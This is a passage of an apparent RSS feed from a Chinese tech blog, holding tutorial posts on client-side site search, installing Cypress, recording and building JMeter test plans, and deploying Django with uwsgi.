	       &lt;span style=&#34;color:#a6e22e&#34;&gt;searchKey&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;query=&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
	       &lt;span style=&#34;color:#75715e&#34;&gt;// $(&amp;#39;#404&amp;#39;).text(decodeURI(searchKey));
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	       &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#404&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;text&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;搜索结果&amp;#39;&lt;/span&gt;)
	       &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/index.xml&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;){
	           &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;item&amp;#34;&lt;/span&gt;);
	           &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
	           &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;node&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
	           &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;) {
	               &lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;;
	               &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;searchKey&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;){
	                  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;;
	                  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;);
	                  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;link&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;;
	                  &lt;span style=&#34;color:#a6e22e&#34;&gt;node&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;node&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span&gt;
	               };
	               &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
	           }
	           &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createElement&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;div&amp;#34;&lt;/span&gt;)
	           &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;node&lt;/span&gt;;
	           &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#404content&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;)
	       });
	   }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2利用-bing-搜索引擎实现&#34;&gt;2.利用 Bing 搜索引擎实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Bing 搜索可以收录 GitHub Page ，因此可以在 Bing 中进行搜索&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;site:(https://ac-lm.github.io/posts)&lt;/code&gt; 可以将搜索范围固定在对应的 GitHub Page 中&lt;/li&gt;
&lt;li&gt;JavaScript 实现略&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Cypress—安装</title>
        <link>https://ac-lm.github.io/posts/cypress/cypress%E5%AE%89%E8%A3%85/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/cypress/cypress%E5%AE%89%E8%A3%85/</guid>
        <description>&lt;h2 id=&#34;cypress&#34;&gt;Cypress&lt;/h2&gt;
&lt;p&gt;Cypress 是使用现代 JavaScript 框架构建的前端测试工具。&lt;/p&gt;
&lt;h2 id=&#34;环境&#34;&gt;环境&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;node.js&lt;/code&gt;，安装 &amp;gt; &lt;a class=&#34;link&#34; href=&#34;https://nodejs.org/zh-cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Node.js (nodejs.org)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;
&lt;p&gt;下载 &lt;a class=&#34;link&#34; href=&#34;https://docs.cypress.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cypress&lt;/a&gt;，执行下列命令安装&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cd /your/project/path
npm install cypress --save-dev
&lt;span style=&#34;color:#75715e&#34;&gt;# 将 cypress 工程依赖安装在工程目录下&lt;/span&gt;
./node_modules/.bin/cypress.cmd version
&lt;span style=&#34;color:#75715e&#34;&gt;# Windows 下执行该命令&lt;/span&gt;
./node_modules/.bin/cypress version
&lt;span style=&#34;color:#75715e&#34;&gt;# Linux 执行该命令&lt;/span&gt;
./node_modules/.bin/cypress.cmd install
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装 cypress 二进程应用程序，程序将会被安装在  C:\Users\13126\AppData\Local\Cypress\Cache\8.3.1\Cypress 以供全局使用&lt;/span&gt;
./node_modules/.bin/cypress.cmd open
npx cypress open
&lt;span style=&#34;color:#75715e&#34;&gt;# 启动项目&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—JMeter 录制测试脚本</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E5%BD%95%E5%88%B6%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E5%BD%95%E5%88%B6%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://jmeter.apache.org/usermanual/jmeter_proxy_step_by_step.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache JMeter - Apache JMeter HTTP(S) Test Script Recorder&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1jmeter设置代理服务器&#34;&gt;1.JMeter设置代理服务器&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在工具栏中选择 &lt;strong&gt;Templates…&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291755548.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291755548.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;搜索并选择 &lt;strong&gt;Recording&lt;/strong&gt; 脚本录制模板&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291756926.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291756926.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;此时出现如图完整的 &lt;strong&gt;Test Plan&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291756394.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291756394.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 &lt;strong&gt;HTTP(S) Test Script Recorder&lt;/strong&gt; 中，点击启动即可，开启 Jmeter 服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291756101.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291756101.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2证书&#34;&gt;2.证书&lt;/h2&gt;
&lt;p&gt;JMeter 启动代理服务器后会在 &lt;strong&gt;JMETER_HOME/bin&lt;/strong&gt; 中生成一个证书 &lt;strong&gt;ApacheJMeterTemporaryRootCA.crt&lt;/strong&gt; ，用户需要安装此证书，才可使用代理服务器。&lt;/p&gt;
&lt;p&gt;打开任意浏览器，在设置中搜索证书，前往证书设置界面，导入证书至 &lt;strong&gt;受信任的根证书颁布机构&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;3浏览器配置&#34;&gt;3.浏览器配置&lt;/h2&gt;
&lt;p&gt;打开任意浏览器，在设置中搜索代理，前往代理设置界面，配置如下内容，启动代理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;地址：&lt;strong&gt;localhost&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Port：&lt;strong&gt;8888&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291757581.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291757581.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;4查看结果&#34;&gt;4.查看结果&lt;/h2&gt;
&lt;p&gt;尝试在浏览器中点击多个链接，关闭浏览器后，您可以在 &lt;strong&gt;Thread Group -&amp;gt; Recording Controller&lt;/strong&gt; 中看到 JMeter 捕抓的HTTP请求内容&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Net—JMeter 测试计划构建</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E6%B5%8B%E8%AF%95%E8%AE%A1%E5%88%92%E6%9E%84%E5%BB%BA/</link>
        <pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E6%B5%8B%E8%AF%95%E8%AE%A1%E5%88%92%E6%9E%84%E5%BB%BA/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://jmeter.apache.org/usermanual/build-web-test-plan.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache JMeter - User&amp;rsquo;s Manual: Building a Web Test Plan&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;‎在下文中，将介绍如何创建一个基本‎‎的测试计划‎‎来测试 Web 网站。您将创建五个用户，将请求发送到 JMeter 网站上的两个页面。此外，您还会告诉用户运行他们的测试两次。因此，请求总数为 （5 个用户） x （2 个请求） x （重复 2 次） = 20 个 HTTP 请求。&lt;/p&gt;
&lt;h2 id=&#34;1添加用户&#34;&gt;1.添加用户&lt;/h2&gt;
&lt;p&gt;要执行测试计划，您要做的第一步就是添加‎‎线程组‎‎元素。线程组会告诉 JMeter 您要模拟的用户数量、用户发送请求的频率以及他们应发送的请求数量。‎&lt;/p&gt;
&lt;p&gt;首先选择测试计划，然后单击右键获取添加菜单，然后选择添加—&amp;gt;线程组。‎&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291754285.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291754285.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后为我们的线程组提供更具描述性的名称。在名称字段中，输入 JMeter 用户。‎接下来，将用户数（称为线程）增加到 5。‎‎在下一个字段中，延时保留默认值 1 秒，此属性告诉 JMeter 在启动每个用户之间延迟多长时间。例如，如果您输入了 5 秒的 Ramp-Up ，JMeter 将在 5 秒结束时完成启动所有用户，因此，如果我们有 5 个用户和 5 秒的 Ramp-Up ，则启动用户之间的延迟将是 1 秒（5 个用户 / 5 秒 = 每秒 1 个用户）。如果将值设置为 0，则 JMeter 将立即启动所有用户。‎&lt;/p&gt;
&lt;p&gt;‎最后在循环计数字段中输入 2 值。此属性告诉 JMeter 重复测试的次数。如果您输入 1 的循环计数值，则 JMeter 将只运行您的测试一次。要让 JMeter 反复运行您的测试计划，请选择 Infinite。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291754077.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291754077.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2添加http请求默认值&#34;&gt;2.添加HTTP请求默认值&lt;/h2&gt;
&lt;p&gt;右键获取 Add 菜单，选择 Add → Config Element → HTTP Request Defaults。在 Path 中填入默认路径&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291754950.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291754950.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3添加cookie管理器&#34;&gt;3.添加Cookie管理器&lt;/h2&gt;
&lt;p&gt;几乎所有的 Web 测试都应使用 Cookie 支持，除非您的应用程序特别不使用 Cookie。要添加 Cookie 支持，只需在测试计划中向每个线程组添加 &lt;strong&gt;HTTP Cookie Manager&lt;/strong&gt; 即可。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291754742.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291754742.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;4添加-http-请求&#34;&gt;4.添加 HTTP 请求&lt;/h2&gt;
&lt;p&gt;右键，添加→采样器→ HTTP 请求，添加以下两个请求&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291754840.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291754840.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291755738.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291755738.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;5添加监听器&#34;&gt;5.添加监听器&lt;/h2&gt;
&lt;p&gt;监听器负责将 HTTP 请求的所有结果存储在文件中，并呈现数据的可视化模型。‎这里我们选择 Graph Results listener (Add → Listener → Graph Results listener)&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Django—部署</title>
        <link>https://ac-lm.github.io/posts/django/django%E9%83%A8%E7%BD%B2/</link>
        <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E9%83%A8%E7%BD%B2/</guid>
        <description>&lt;h2 id=&#34;1配置-uwsgi&#34;&gt;1.配置 uwsgi&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;安装：&lt;code&gt;pip install uwsgi&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;测试：&lt;code&gt;uwsgi --http-socket :80 --file test.py&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# test.py&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;(env, start_response):
    start_response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, [(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;)])
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello World&amp;#34;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;配置文件：&lt;code&gt;uwsgi.ini&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;[uwsgi]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用nginx连接时使用&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# socket=0.0.0.0:8000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 直接做web服务器, python manage.py runserver ip:port&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0.0.0.0:8000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 路径为 0.0.0.0，表本地，使用127.0.0.1可能会无法从外网访问&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 项目目录&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;chdir&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/home/mayanan/bj18/dailyfresh&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 项目中wsgi.py文件的目录，相对于项目目录&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;wsgi-file&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;dailyfresh/wsgi.py&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定启动的工作进程数&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;processes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定工作进程中的线程数&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;threads&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;master&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;True&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 保存启动后，主进程的pid&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pidfile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;uwsgi.pid&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 设置uwsgi后台运行, uwsgi.log保存日志信息&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;daemonize&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;uwsgi.log&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;启动：&lt;code&gt;uwsgi --ini uwsgi.ini&lt;/code&gt;，uwsgi 通过 ini 文件启动后会在相同目录下生成一个 pid 文件，包含主进程的进程号&lt;/li&gt;
&lt;li&gt;重载：&lt;code&gt;uwsgi --reload uwsgi.pid&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;停止：&lt;code&gt;uwsgi --stop uwsgi.pid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2配置-django&#34;&gt;2.配置 Django&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;测试：&lt;code&gt;python manage.py runserver 0.0.0.0:8000&lt;/code&gt;，访问宿主机 IP:8000&lt;/li&gt;
&lt;li&gt;配置：&lt;code&gt;setting.py&lt;/code&gt;，&lt;code&gt;DEBUG=False&lt;/code&gt;，&lt;code&gt;ALLOWED_HOSTS=[&#39;*&#39;]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;配置：&lt;code&gt;wsgi.py&lt;/code&gt;，默认情况下以配置完成&lt;/li&gt;
&lt;/ul&gt;
